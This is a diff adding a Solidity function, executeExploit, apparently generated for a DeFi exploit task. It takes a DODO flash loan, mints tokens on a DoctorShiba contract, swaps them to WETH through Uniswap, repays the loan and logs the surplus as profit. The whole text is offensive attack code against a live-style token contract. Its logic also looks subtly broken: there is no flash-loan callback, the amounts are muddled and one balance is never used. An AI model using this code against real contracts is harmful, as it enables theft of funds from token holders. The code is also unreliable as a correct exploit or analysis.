@@ -1,0 +1,42 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Set up the necessary addresses and tokens
+    IERC20 baseToken = IERC20(valuableToken); // this is the token we want to exploit
+    address dodo = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476; // DODO flash loan contract
+
+    // Flashloan baseToken from Dodo
+    IDODO(dodo).flashLoan(amount, 0, address(this), "");
+
+    // After receiving the flash loan, we can exploit the DoctorShiba contract
+    IDoctorShiba targetContract = IDoctorShiba(target);
+    // First, approve the target contract to spend the tokens
+    baseToken.approve(target, amount);
+
+    // Now mint the tokens in the target contract
+    targetContract.mint(address(this), amount);
+
+    // After minting, we can swap the tokens back to WETH or base token depending on the pairs
+    address[] memory path = new address[](2);
+    path[0] = address(baseToken);
+    path[1] = uniswapRouter.WETH(); // assuming we want to convert to WETH for simplicity
+
+    // Swap tokens for WETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amount,
+        0, // accept any amount of WETH
+        path,
+        address(this), // the recipient of the WETH
+        block.timestamp
+    );
+
+    // Repay the flashloan with interest (which is zero in this case)
+    uint256 baseBalance = baseToken.balanceOf(address(this));
+    baseToken.transfer(dodo, amount);
+    
+    // Any remaining amount is profit
+    uint256 surplus = baseToken.balanceOf(address(this));
+    console.log("Surplus: %s", surplus);
+}
+</executeExploitCode>
+```
